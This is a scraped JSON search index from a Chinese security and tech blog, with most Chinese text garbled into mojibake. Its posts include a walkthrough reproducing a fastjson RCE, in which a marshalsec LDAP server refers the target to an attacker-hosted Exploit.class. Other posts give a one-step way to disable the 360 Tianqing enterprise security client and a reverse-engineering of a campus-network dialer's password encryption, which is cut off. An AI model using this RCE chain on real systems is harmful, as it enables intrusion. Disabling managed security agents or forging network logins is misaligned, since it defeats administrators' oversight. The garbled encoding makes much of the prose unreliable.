\u0026ldquo;$($_.InstallLocation)\\AppXManifest.xml\u0026rdquo;}\nUninstall \u0026amp; Reinstall Store Windows Key+X \u0026gt; Windows Powershell (Admin) \u0026gt; Copy the following from below and right click in Powershell to paste \u0026gt; Enter Get-AppxPackage -allusers Microsoft.WindowsStore | Remove-AppxPackage\nCopy the following from below and right click in Powershell to paste \u0026gt; Enter \u0026gt; Reboot your computer\nGet-AppxPackage -allusers Microsoft.WindowsStore | Foreach {Add-AppxPackage -DisableDevelopmentMode -Register â€œ$($_.InstallLocation)\\AppXManifest.xmlâ€}\nè¿™äº›ä¸€ä¸ªä¸ªè¯•ï¼Œæ ¹æ®å¤§å®¶çš„åé¦ˆï¼ŒåŸºæœ¬ç¬¬ä¸‰ä¸ªå¯ä»¥æˆåŠŸï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸‰ä¸ªæ–¹æ³•æˆåŠŸçš„\n","permalink":"https://www.hacktech.cn/post/microsoft-store-cannot-install-dfp.html","summary":"\u003cp\u003eå…·ä½“è¡¨ç°ä¸ºä¸€ç›´å®‰è£…å¤±è´¥ï¼Œä½†æ˜¯ä¸‹è½½è¿›åº¦æ¡ä¸€ç›´åœ¨ï¼Œæ— æ³•å»é™¤ã€‚\u003c/p\u003e","title":"å¾®è½¯å•†åº—ä¸€ç›´å®‰è£…ä¸ä¸ŠIntel Media SDK DFP"},{"content":"è¿™ä¸¤å¤©çˆ†å‡ºäº† fastjson çš„è€æ´ï¼Œå¤ç°ç®€å•è®°å½•ä¸€ä¸‹ã€‚\né¦–å…ˆä½¿ç”¨ spark æ­å»ºä¸€ä¸ªç®€æ˜“çš„åˆ©ç”¨ fastjson è§£æ json çš„ http serverã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package cn.hacktech.fastjsonserver; import com.alibaba.fastjson.JSON; import static spark.Spark.*; public class Main { public static void main(String[] args) { get(\u0026#34;/hello\u0026#34;, (req, res) -\u0026gt; \u0026#34;spark server start success\u0026#34;); post(\u0026#34;/test\u0026#34;, (req, res) -\u0026gt; { String payload = req.body(); JSON.parse(payload); return \u0026#34;json payloadï¼š\u0026#34; + payload; }); } } ç¼–è¯‘å‡ºæ¥åï¼Œå¯åŠ¨è¿™ä¸ª jarï¼Œåœ¨ /test è¿™ä¸ª post ç‚¹å³å¯ post json payloadã€‚\nç„¶åè¿™é‡Œåˆ†ä¸¤ç±»ï¼š\nå¦‚æœåªæ˜¯æƒ³æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œå¯ä»¥ä½¿ç”¨ dnslog å»æ£€æµ‹ åˆ©ç”¨çš„è¯ï¼Œéœ€è¦è‡ªå·±èµ·ä¸€ä¸ªæ¶æ„çš„ ldap æˆ–è€… rmi æœåŠ¡ æœ¬æœºéœ€è¦èµ·ä¸€ä¸ª LDAP æœåŠ¡å’Œ http æœåŠ¡\n1 poc--\u0026gt;LDAP--\u0026gt;http poc ä¼šé€šè¿‡ä¸Šé¢çš„è·¯å¾„å»è¯·æ±‚ä½ çš„ http æœåŠ¡ä¸Šé¢çš„å¯¹åº”çš„ class æ–‡ä»¶ç„¶åå»è§£ææ‰§è¡Œè¿™ä¸ª class\nå¯åŠ¨ LDAP ç”¨çš„ marshalsecï¼Œä¼šæ¯”è¾ƒæ–¹ä¾¿ã€‚\nåœ¨æœ¬ç›®å½•ä¸‹å¯åŠ¨ http server åœ¨ 80 ç«¯å£ 1 python -m http.server 80 å¯åŠ¨ LDAP æœåŠ¡ 1 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit åé¢çš„ Exploit æ˜¯æŒ‡ Exploit.class æ–‡ä»¶\nè¿è¡Œ PoCï¼Œå®ƒä¼šè¯·æ±‚ LDAP æœåŠ¡ï¼Œæˆ–è€…ç›´æ¥æŠŠ json payload post åˆ° /test 1 java -cp fastjson-1.2.47.jar; PoC å…¶ä¸­ä»£ç ç¼–è¯‘çš„è¯ï¼Œç›´æ¥æ‰§è¡Œ javac the.java å³å¯ï¼Œä¸è¿‡ PoC.java çš„ç¼–è¯‘éœ€è¦å¼•å…¥ fastjson jar åŒ…ï¼Œè¿è¡Œ javac -cp ./fastjson-1.2.47.jar PoC.java\nå…·ä½“çš„ç»†èŠ‚å¯è§ä»£ç æ‰“åŒ…æ–‡ä»¶\nå¤ç°é‡åˆ°ä¸€äº›å‘ è¿™æ¬¡çš„è¿™ä¸ªæ´æ˜¯æœ‰ jdk ç‰ˆæœ¬è¦æ±‚çš„ã€‚\næœ€å¼€å§‹æˆ‘åœ¨æˆ‘æœ¬æœºæµ‹è¯•é€šè¿‡ï¼ŒåŸå› æ˜¯å› ä¸ºå®ƒè¯·æ±‚ä¸åˆ° class çš„æ—¶å€™ä¼šå»æœ¬ç›®å½•ä¸‹è¿›è¡Œä¸€ä¸ªæŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯å¹¶æ²¡æœ‰ç»è¿‡ http æœåŠ¡å™¨ã€‚\næ‰€ä»¥æƒ³è¦å¤ç°è¿™ä¸ªæ¼æ´çš„è¯ï¼Œéœ€è¦ target ä¸»æœºä¸Šé¢çš„ jdk ç‰ˆæœ¬æœ‰ä¸¥æ ¼çš„è¦æ±‚ï¼Œå…·ä½“è§ä¸‹å›¾\næ‰€ä»¥å»ºè®®å¤ç°æµç¨‹æ˜¯\nå»ºè®®å¤ç°æµç¨‹ èµ·ä¸€ä¸ªè™šæ‹Ÿæœºä¸“é—¨ç”¨æ¥è¿è¡Œæˆ‘å†™çš„é‚£ä¸ªç®€æ˜“çš„ fastjsonserverï¼Œæˆ–è€…ä½ å¯ä»¥ç›´æ¥åœ¨è™šæ‹Ÿæœºä¸Šé¢æ‰§è¡Œ PoCï¼Œå…³é”®åœ¨äº target æœºå™¨çš„ jdk ç‰ˆæœ¬ã€‚ ä½ å¯ä»¥åœ¨æœ¬æœºèµ· ldap/rmi æœåŠ¡ä»¥åŠ http æœåŠ¡ï¼Œæˆ–è€…å…¨éƒ¨åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯ä¸€èˆ¬çœŸå®æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯åœ¨å¤–éƒ¨æ„é€ æ¶æ„çš„ ldap/rmi ä»¥åŠ http serverï¼Œæ‰€ä»¥å»ºè®®è¿™æ­¥æ”¾åˆ°è™šæ‹Ÿæœºå¤–è¿è¡Œã€‚ æ ¹æ®ä½ çš„ç½‘ç»œç¯å¢ƒä¿®æ”¹ PoCã€‚ ç„¶å post payload æˆ–è€…è¿è¡Œ PoCï¼Œå³å¯çœ‹åˆ°è™šæ‹Ÿæœºä¸Šå¼¹å‡ºäº†è®¡ç®—å™¨ã€‚ ä½ç‰ˆæœ¬çš„java 8u112 é“¾æ¥: https://pan.baidu.com/s/1Q3lGG2b4I8aTXpQbmvK2dw æå–ç : 36mm\nå¤ç°è§†é¢‘é“¾æ¥ï¼šå¤ç°æµç¨‹.zip\n","permalink":"https://www.hacktech.cn/post/fastjson-under-1.2.47-rce.html","summary":"\u003cp\u003eè¿™ä¸¤å¤©çˆ†å‡ºäº† fastjson çš„è€æ´ï¼Œå¤ç°ç®€å•è®°å½•ä¸€ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä½¿ç”¨ spark æ­å»ºä¸€ä¸ªç®€æ˜“çš„åˆ©ç”¨ fastjson è§£æ json çš„ http serverã€‚\u003c/p\u003e","title":"fastjson\u003c1.2.47 RCE æ¼æ´å¤ç°"},{"content":"æœ€è¿‘å‘ç³»ç»Ÿæ·»åŠ äº†æ–°ç”¨æˆ·è´¦å·åå‡ºç°äº†é—®é¢˜ï¼Œå°è¯•ä½¿ç”¨ç§é’¥ç™»é™†æœåŠ¡å™¨ï¼Œæç¤ºäº† Bad owner or permissions on .ssh/config è¿™ä¸ªæŠ¥é”™ï¼Œå°±æ˜¯å¦‚é¢˜ä¸­çš„é—®é¢˜\nä¿®å¤ æŒ‰ç…§Windows 10 GUIä¸­çš„è¿™äº›æ­¥éª¤è§£å†³æƒé™é—®é¢˜ï¼š\næ‰¾åˆ°.sshæ–‡ä»¶å¤¹ã€‚å®ƒé€šå¸¸ä½äºC:\\Users\\ï¼Œä¾‹å¦‚C:\\Users\\Akkumanã€‚ å³é”®å•å‡».sshæ–‡ä»¶å¤¹ï¼Œç„¶åå•å‡»â€œå±æ€§â€ã€‚ æ‰¾åˆ°å¹¶ç‚¹å‡»â€œå®‰å…¨â€æ ‡ç­¾ã€‚ ç„¶åå•å‡»â€œé«˜çº§â€ã€‚ å•å‡»â€œç¦ç”¨ç»§æ‰¿â€ï¼Œå•å‡»â€œç¡®å®šâ€ã€‚ å°†å‡ºç°è­¦å‘Šå¼¹å‡ºçª—å£ã€‚å•å‡»â€œä»æ­¤å¯¹è±¡ä¸­åˆ é™¤æ‰€æœ‰ç»§æ‰¿çš„æƒé™â€ã€‚ ä½ ä¼šæ³¨æ„åˆ°æ‰€æœ‰ç”¨æˆ·éƒ½å°†è¢«åˆ é™¤ã€‚è®©æˆ‘ä»¬æ·»åŠ æ‰€æœ‰è€…ã€‚åœ¨åŒä¸€çª—å£ä¸­ï¼Œå•å‡»â€œç¼–è¾‘â€æŒ‰é’®ã€‚ æ¥ä¸‹æ¥ï¼Œå•å‡»â€œæ·»åŠ â€ä»¥æ˜¾ç¤ºâ€œé€‰æ‹©ç”¨æˆ·æˆ–ç»„â€çª—å£ã€‚ å•å‡»â€œé«˜çº§â€ï¼Œç„¶åå•å‡»â€œç«‹å³æŸ¥æ‰¾â€æŒ‰é’®ã€‚åº”æ˜¾ç¤ºç”¨æˆ·ç»“æœåˆ—è¡¨ã€‚ é€‰æ‹©æ‚¨çš„ç”¨æˆ·å¸æˆ·ã€‚ ç„¶åå•å‡»â€œç¡®å®šâ€ï¼ˆå¤§çº¦ä¸‰æ¬¡ï¼‰ä»¥å…³é—­æ‰€æœ‰çª—å£ã€‚ å®Œæˆæ‰€æœ‰æ“ä½œåï¼Œå†æ¬¡å…³é—­å¹¶æ‰“å¼€cmderåº”ç”¨ç¨‹åºå¹¶å°è¯•è¿æ¥åˆ°è¿œç¨‹SSHä¸»æœºã€‚\nç°åœ¨è¿™ä¸ªé—®é¢˜åº”è¯¥è§£å†³äº†ã€‚\n","permalink":"https://www.hacktech.cn/post/bad-owner-or-permissions-ssh-win10.html","summary":"\u003cp\u003eæœ€è¿‘å‘ç³»ç»Ÿæ·»åŠ äº†æ–°ç”¨æˆ·è´¦å·åå‡ºç°äº†é—®é¢˜ï¼Œå°è¯•ä½¿ç”¨ç§é’¥ç™»é™†æœåŠ¡å™¨ï¼Œæç¤ºäº† Bad owner or permissions on .ssh/config è¿™ä¸ªæŠ¥é”™ï¼Œå°±æ˜¯å¦‚é¢˜ä¸­çš„é—®é¢˜\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/img/1106918-20190715102859616-1893463244.png\" alt=\"\"  /\u003e\n\u003c/p\u003e","title":"Bad owner or permissions on .ssh/config win10é—®é¢˜è§£å†³"},{"content":"å‰é˜µå­æœ‰ä¸ªéœ€æ±‚æ˜¯ä½¿ç”¨ golang æŠ“åŒ…æ”¹åŒ…ï¼Œæˆ‘ç”¨åˆ°äº† gopacket è¿™ä¸ªåŒ…ï¼Œä½†æ˜¯å‡ºäº†ä¸€äº›å°é—®é¢˜ã€‚\næˆ‘æŒ‰ç…§ç½‘ä¸Šçš„æ–¹æ³•è¿›è¡Œä½¿ç”¨ OpenLive æŠ“åŒ…ï¼Œå‘ç°å¹¶ä¸è¡Œï¼ŒæŠ¥é”™ error open adapter å•¥å•¥å•¥ã€‚\nç»è¿‡è°ƒè¯•å‘ç°æ ¹æœ¬æ‰¾ä¸åˆ°è¿™ä¸ªç½‘å¡ï¼Œéœ€è¦ç”¨ \\Device\\NPF_ å¼€å¤´çš„ç½‘å¡è®¾å¤‡åï¼Œæˆ‘å»çœ‹äº† scapy çš„å®ç°ï¼Œå‘ç°ä½¿ç”¨çš„æ˜¯ winpcap/npcap é©±åŠ¨çš„ pcap_findalldevs è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘å» gopacket é‡Œé¢æ‰¾äº†ä¸‹ï¼Œå‘ç°æœ‰ä¸ªæ–¹æ³• pcap.FindAllDevs() å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„ç½‘å¡ä¿¡æ¯ã€‚\nä½†æ˜¯ç”¨è¿™ä¸ªæ–¹æ³•å¾—åˆ°çš„æ•°æ®é‡Œé¢çš„ windows è‡ªå¸¦çš„ç½‘å¡çš„ Description æè¿°å­—æ®µä¸Šå°±åªæœ‰ä¸ª microsoftï¼Œå‹æ ¹ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œç»“åˆ net.interifaces() æ–¹æ³•ä¸­çš„ ip ä¸ä¹‹å‰å¾—åˆ°çš„æ•°æ®å¯¹åº”èµ·æ¥ï¼Œå¾—åˆ°äº†ä¸€ä¸ªç®€é™‹çš„æ–¹æ¡ˆ\nç›´æ¥ä¸Šä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) type IfaceInfo struct { NPFName string Description string NickName string IPv4 string } func get_if_list() []IfaceInfo { var ifaceInfoList []IfaceInfo // å¾—åˆ°æ‰€æœ‰çš„(ç½‘ç»œ)è®¾å¤‡ devices, err := pcap.FindAllDevs() if err != nil { log.Fatal(err) } interface_list, err := net.Interfaces() if err != nil { log.Fatal(err) } for _, i := range interface_list { byName, err := net.InterfaceByName(i.Name) if err != nil { log.Fatal(err) } address, err := byName.Addrs() ifaceInfoList = append(ifaceInfoList, IfaceInfo{NickName: byName.Name, IPv4: address[1].String()}) } // æ‰“å°è®¾å¤‡ä¿¡æ¯ // fmt.Println(\u0026#34;Devices found:\u0026#34;) // for _, device := range devices { // fmt.Println(\u0026#34;\\nName: \u0026#34;, device.Name) // fmt.Println(\u0026#34;Description: \u0026#34;, device.Description) // fmt.Println(\u0026#34;Devices addresses: \u0026#34;, device.Description) // for _, address := range device.Addresses { // fmt.Println(\u0026#34;- IP address: \u0026#34;, address.IP) // fmt.Println(\u0026#34;- Subnet mask: \u0026#34;, address.Netmask) // } // } var vaildIfaces []IfaceInfo for _, device := range devices { for _, address := range device.Addresses { for _, ifaceinfo := range ifaceInfoList { if strings.Contains(ifaceinfo.IPv4, address.IP.String()) { vaildIfaces = append(vaildIfaces, IfaceInfo{NPFName: device.Name, Description: device.Description, NickName: ifaceinfo.NickName, IPv4: ifaceinfo.IPv4}) break } } } } return vaildIfaces } func main() { fmt.Println(get_if_list()) } ","permalink":"https://www.hacktech.cn/post/gopacket-problem-on-windows.html","summary":"\u003cp\u003eå‰é˜µå­æœ‰ä¸ªéœ€æ±‚æ˜¯ä½¿ç”¨ golang æŠ“åŒ…æ”¹åŒ…ï¼Œæˆ‘ç”¨åˆ°äº† gopacket è¿™ä¸ªåŒ…ï¼Œä½†æ˜¯å‡ºäº†ä¸€äº›å°é—®é¢˜ã€‚\u003c/p\u003e","title":"gopacket åœ¨ windows ä¸Šé¢é‡åˆ°çš„é—®é¢˜"},{"content":"åˆ é™¤ C:\\Program Files (x86)\\360\\360Safe\\EntClient\\conf\\EntBase.dat å³å¯é€€å‡ºï¼Œå¯ç”¨å¤©æ“è‡ªèº«çš„ç²‰ç¢æ–‡ä»¶åŠŸèƒ½è¿›è¡Œåˆ é™¤\n","permalink":"https://www.hacktech.cn/post/how-to-exit-tianqing.html","summary":"\u003cp\u003eåˆ é™¤ C:\\Program Files (x86)\\360\\360Safe\\EntClient\\conf\\EntBase.dat å³å¯é€€å‡ºï¼Œå¯ç”¨å¤©æ“è‡ªèº«çš„ç²‰ç¢æ–‡ä»¶åŠŸèƒ½è¿›è¡Œåˆ é™¤\u003c/p\u003e","title":"å¦‚ä½•é€€å‡ºå¤©æ“"},{"content":"ä»Šå¤©é‡åˆ°ä¸€ä¸ªå¾ˆæ€ªçš„é—®é¢˜ï¼Œæˆ‘æƒ³æŠŠæˆ‘çš„ä¸€ä¸ªå­æ¨¡å—åˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¸Šæ¸¸ï¼Œæˆ‘æŒ‰ç…§ç½‘ä¸Šçš„æ–¹æ³•åˆ é™¤å­æ¨¡å—ç„¶åæ–°å»ºåï¼Œè¿™ä¸ªå­æ¨¡å—ä¾æ—§è·Ÿè¸ªç€æˆ‘å…ˆå‰çš„ä¸Šæ¸¸ã€‚è‡ªå·±æ‘¸ç´¢äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ–¹æ³•æ¯”è¾ƒå‚»ï¼Œä¸è¿‡æ˜¯å¯è¡Œçš„ï¼Œå¸Œæœ›èƒ½ç»™å¤§å®¶ä¸€äº›å¸®åŠ©ã€‚\nä½¿åŸå…ˆå­æ¨¡å—ä¸è¢«ç‰ˆæœ¬æ§åˆ¶ï¼ˆå…ˆæŠŠå­æ¨¡å—ä»ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿç§»é™¤ï¼‰ 1 git rm --cached /path/to/files åˆ é™¤å­æ¨¡å—ç›®å½• 1 rm -rf /path/to/files ä¿®æ”¹ .gitmodulesï¼Œç§»é™¤è¿™ä¸ª submodule 1 2 3 -[submodule \u0026#34;themes/next\u0026#34;] -\tpath = themes/next -\turl = https://github.com/theme-next/hexo-theme-next.git ä¿®æ”¹ .git/config å†…å®¹ï¼ŒæŠŠéœ€è¦åˆ é™¤çš„ submodule é…ç½®é¡¹åˆ é™¤ ä¿®æ”¹ .git/modules æ–‡ä»¶å¤¹å†…å®¹ï¼ŒæŠŠä½ æƒ³è¦åˆ é™¤çš„å­æ¨¡å—ç›®å½•åˆ é™¤ï¼ˆè¿™é¡¹ååˆ†é‡è¦ï¼Œæˆ–è€…ä½ çŸ¥é“æ€ä¹ˆä¿®æ”¹ä¹Ÿå¯ä»¥ä¿®æ”¹ï¼Œä¸ç„¶å¯¼è‡´çš„åæœå°±æ˜¯ä½ æ”¹è¿‡æ¥çš„åŒåå­æ¨¡å—ä¾ç„¶è·Ÿè¸ªç€ä¹‹å‰çš„åˆ†æ”¯ï¼Œgit pull ä¹Ÿæ²¡æ³•æ‹‰å–ä½ åœ¨ .gitmosules ä¸­æ–°å®šä¹‰çš„ä¸Šæ¸¸åœ°å€ï¼‰ åé¢å†æŒ‰ç…§æ™®é€šçš„æ–¹æ³•æ·»åŠ å­æ¨¡å—å³å¯ ä¸€äº›å­æ¨¡å—çš„æ“ä½œå¯ä»¥å‚è§Git Submodule ç”¨æ³•ç­†è¨˜\n","permalink":"https://www.hacktech.cn/post/git-rm-or-change-submodule.html","summary":"\u003cp\u003eä»Šå¤©é‡åˆ°ä¸€ä¸ªå¾ˆæ€ªçš„é—®é¢˜ï¼Œæˆ‘æƒ³æŠŠæˆ‘çš„ä¸€ä¸ªå­æ¨¡å—åˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¸Šæ¸¸ï¼Œæˆ‘æŒ‰ç…§ç½‘ä¸Šçš„æ–¹æ³•åˆ é™¤å­æ¨¡å—ç„¶åæ–°å»ºåï¼Œè¿™ä¸ªå­æ¨¡å—ä¾æ—§è·Ÿè¸ªç€æˆ‘å…ˆå‰çš„ä¸Šæ¸¸ã€‚è‡ªå·±æ‘¸ç´¢äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ–¹æ³•æ¯”è¾ƒå‚»ï¼Œä¸è¿‡æ˜¯å¯è¡Œçš„ï¼Œå¸Œæœ›èƒ½ç»™å¤§å®¶ä¸€äº›å¸®åŠ©ã€‚\u003c/p\u003e","title":"gitå½»åº•åˆ é™¤æˆ–å˜æ›´å­æ¨¡å—"},{"content":"æ¹–åŒ—æ ¡å›­ç½‘PCç«¯æ‹¨å·ç®—æ³•é€†å‘ å‰è¨€ ä¸Šä¸€æ–‡ PPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆæˆ‘ä»¬è°ˆåˆ°ä½¿ç”¨ PPPoE æ‹¦æˆªæ¥è·å–çœŸå®çš„è´¦å·å¯†ç ã€‚\nåœ¨è¿™ä¸ªçš„åŸºç¡€ä¸Šï¼Œæˆ‘å¯¹æˆ‘ä»¬æ¹–åŒ—çš„å®¢æˆ·ç«¯è¿›è¡Œäº†é€†å‘ï¼Œå¾—åˆ°äº†æ‹¨å·åŠ å¯†ç®—æ³•ã€‚\nå‡†å¤‡å·¥ä½œ é¦–å…ˆæŸ¥å£³ï¼Œå‘ç°è¿™ä¸ªç‰ˆæœ¬æ²¡å£³äº†ï¼Œæˆ‘è®°å¾—ä¹‹å‰å¥½åƒæ˜¯åŠ è¿‡ vmp çš„å‘€ï¼Œä¸ç®¡äº†ã€‚\nç„¶åæˆ‘ä»¬çœ‹çœ‹ç›®å½•ä¸‹çš„ dll å¯¼å‡ºè¡¨çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¥½ä¸œè¥¿\nAidcComm.dll é‡Œé¢æœ‰è¿™äº›ä¸œè¥¿ï¼Œçœ‹æ¥è¿™ä¸ªæå¤§å¯èƒ½ä¼šæ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚\næˆ‘ä»¬å†çœ‹çœ‹ä¸»ç¨‹åºçš„å¯¼å…¥è¡¨ï¼Œå‘ç°ä¸»ç¨‹åºçš„å¯¼å…¥è¡¨é‡Œé¢å¹¶æ²¡æœ‰è¿™ä¸ª dllï¼Œé‚£æˆ‘ä»¬åŠ¨æ€è°ƒè¯•çš„æ—¶å€™åº”è¯¥æ€ä¹ˆæ–­åˆ°è¿™ä¸ª dll ä¸­å»å‘¢ã€‚\næ²¡æœ‰å¯¼å…¥è¡¨è¯´æ˜æ²¡æœ‰ .libï¼Œé‚£æœ‰å¯èƒ½æ˜¯é€šè¿‡ LoadLibrary åŠ è½½çš„ dllï¼Œè‡³äºè‡ªå®ç° peloaderï¼Œæˆ‘è§‰å¾—åº”è¯¥è¿™ä¸ªè½¯ä»¶åº”è¯¥ä¸ä¼šæ˜¯è¿™æ ·ã€‚\nçœ‹çœ‹å°±çŸ¥é“äº†ã€‚\nç›´æ¥ç”¨ x32dbg å’Œ IDA å¼€å§‹çœ‹ã€‚\né€†å‘è¿‡ç¨‹ x32dbg æ‰“å¼€ä¸»ç¨‹åºï¼Œç„¶å bp LoadLibraryWï¼Œå†é‡æ–°è½½å…¥ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥ä¸€æ­¥æ­¥è¿è¡Œå‘ç° AidcComm.dll è¢«è½½å…¥äº†ã€‚\nç„¶åè¿è¡Œåˆ°ç”¨æˆ·ä»£ç å¤„\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶ eax å¯„å­˜å™¨çš„å€¼ä¸º 55870000ï¼Œè¿™ä¸ªå°±æ˜¯ LoadLibrary è¿”å›çš„ HANDLEã€‚ä¸€èˆ¬æ€è·¯æ¥è¯´ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”¨ GetProcAddress è·å–å¯¼å‡ºè¡¨å‡½æ•°çš„åœ°å€äº†ã€‚\nç»§ç»­å¾€ä¸‹èµ°å‡ æ­¥ï¼Œå³å¯å‘ç°æˆ‘ä»¬çš„çŒœæµ‹å¹¶æ²¡æœ‰é”™è¯¯ã€‚\nä»è¿™å¼ å›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸»ç¨‹åºè·å–äº† AidcComm.GetPWD å’Œ AidcComm.GetRegularAccount çš„åœ°å€ã€‚\né‚£æˆ‘ä»¬é€šè¿‡ call ä¹‹åçš„ eax è·³è½¬è¿‡å»åœ¨è¿™ä¸¤ä¸ªå‡½æ•°çš„åœ°å€ä¸‹æ–­ï¼Œç›´æ¥è·‘èµ·æ¥ã€‚\nç„¶åæˆ‘ä»¬ä¼šå‘ç°åœ¨ AidcComm.GetRegularAccount æ–­ä¸‹æ¥äº†ï¼Œä¼ å…¥çš„å‚æ•°å¯ä»¥åœ¨å †æ ˆçª—å£ä¸­çœ‹åˆ°ã€‚\næˆ‘ä»¬å» IDA åˆ†æ GetRegularAccount è¿™ä¸ªå‡½æ•°ï¼ŒåŒæ—¶åœ¨è°ƒè¯•å™¨è¿™è¾¹åŠ¨æ€è·Ÿï¼ˆè¿™ä¸ªæˆ‘å·²ç»åˆ†æè¿‡äº†ï¼Œæ‰€ä»¥æœ‰çš„å˜é‡å’Œå‡½æ•°åæˆ‘å·²ç»æ”¹è¿‡äº†ï¼‰\né¦–å…ˆæœ€ç›´è§‚çš„å°±æ˜¯è´¦å·çš„å˜æ¢ï¼Œè´¦å·åªéœ€è¦åŠ ä¸Šå‰ç¼€ !^Wnds0 å³å¯ï¼ˆä½†å…¶å®åŠ å¯†å‡ºæ¥åï¼Œä¸»ç¨‹åºè¿™ä¸ªç»™å®ƒåˆåŠ äº†ä¸€ä¸ªåç¼€ @hbxyï¼‰ã€‚ï¼ˆä»è°ƒè¯•å™¨å¯ä»¥çœ‹åˆ°ï¼‰\nå¯†ç æˆ‘ä»¬ç›´æ¥è·Ÿåˆ° GetPWD é‡Œé¢å»çœ‹ã€‚\né€šè¿‡è°ƒè¯•å™¨æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿå‡ºï¼Œè¿™ä¸ªåˆ†æ”¯ç»“æ„åªä¼šæ‰§è¡Œ a2 == 1 è¿™ä¸ªåˆ†æ”¯ã€‚\nçœ‹æ¥æ˜¯é€šè¿‡ä¸‹é¢è¿™ä¸ªå‡½æ•°åŠ å¯†çš„äº†ã€‚ï¼ˆæˆ‘ç»™ä»–æ”¹äº†å encryptPwdWithKeyï¼‰ æˆ‘ä»¬è¿›åˆ° encryptPwdWithKey(void *password, char *key, rsize_t SizeInBytes) è¿™ä¸ªå‡½æ•°å»æŸ¥çœ‹ã€‚\né€šè¿‡åˆ†ææˆ‘ä»¬å¯ä»¥å¾—å‡ºå¤§è‡´ä¸Šçš„æµç¨‹\npassword ç”¨ key RC4 ä¸€ä¸‹å¾—åˆ° A æŠŠ A md5 ä¸€ä¸‹å¾—åˆ° Bï¼Œå¦‚æœç¬¬ 11 ä½ä¸ºå¥‡æ•°ï¼Œå– B çš„å‰ 16 ä½ï¼Œå¶æ•°å°±å 16 ä½ï¼Œå¾—åˆ° C C å†ç”¨ key RC4 ä¸€ä¸‹å¾—åˆ° D D å† md5 ä¸€ä¸‹ï¼Œå– [8:24]å¾—åˆ° E ä¹Ÿå°±æ˜¯æœ€åå¾—åˆ°çš„ E æ˜¯åŠ å¯†ä¹‹åçš„ã€‚\nå¯èƒ½æœ‰çš„å°ä¼™ä¼´ä¸æ˜ç™½ä¸ºä»€ä¹ˆä¼šæ˜¯ RC4ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªæç¤ºçš„åœ°æ–¹ï¼Œç¬¬ä¸€æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²çš„æç¤ºï¼Œç¬¬äºŒæ˜¯ RC4 åŠ å¯†æµç¨‹æ˜¯å¾ˆå®¹æ˜“åˆ†è¾¨çš„ï¼Œè¿™ä¸ªé ç»éªŒäº†ã€‚\nä½†æ˜¯æˆ‘ä»¬å‘ç°æˆ‘ä»¬æˆªå–å‡ºæ¥çš„å¯†ç å’Œè¿™ä¸ªæ˜¯æœ‰ç‚¹å°ä¸ä¸€æ ·çš„ã€‚é€šè¿‡è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ GetRegularAccount å‡½æ•°åŠ å¯†å‡ºæ¥åï¼Œåˆè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æˆ‘ç»™å®ƒé‡å‘½åä¸º fixHBKey äº†ã€‚\næˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹\nä»£ç å¹¶ä¸é•¿ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒè¯•å™¨åˆ†æï¼Œå¦‚æœä½ æƒ³ç”¨ IDA ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒIDA å¯ä»¥æœç´¢ä¸Šå›¾ä¸­çš„ \u0026lt;\u0026lt;\u0026lt; FixHBKey: %s \u0026lt;\u0026lt;\u0026lt; è¿™ä¸ªå­—ç¬¦ä¸²æ¥å®šä½è¿™ä¸ªå‡½æ•°ã€‚ æˆ–è€…æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„å…¥å£åœ°å€ä¸º 001115D0ï¼Œè¿™ä¸ª exe çš„åŠ è½½åŸºå€æˆ‘ä»¬å¯ä»¥å¾€ä¸Šæ»‘åˆ°é¡¶çœ‹åˆ°ä¸º 000F1000ï¼Œä¸¤ä¸ªä¹‹é—´çš„å·®å€¼ä¸º 205D0ï¼Œ ç„¶åå†æŠŠè¿™ä¸ªå·®å€¼åŠ ä¸Š IDA åŠ 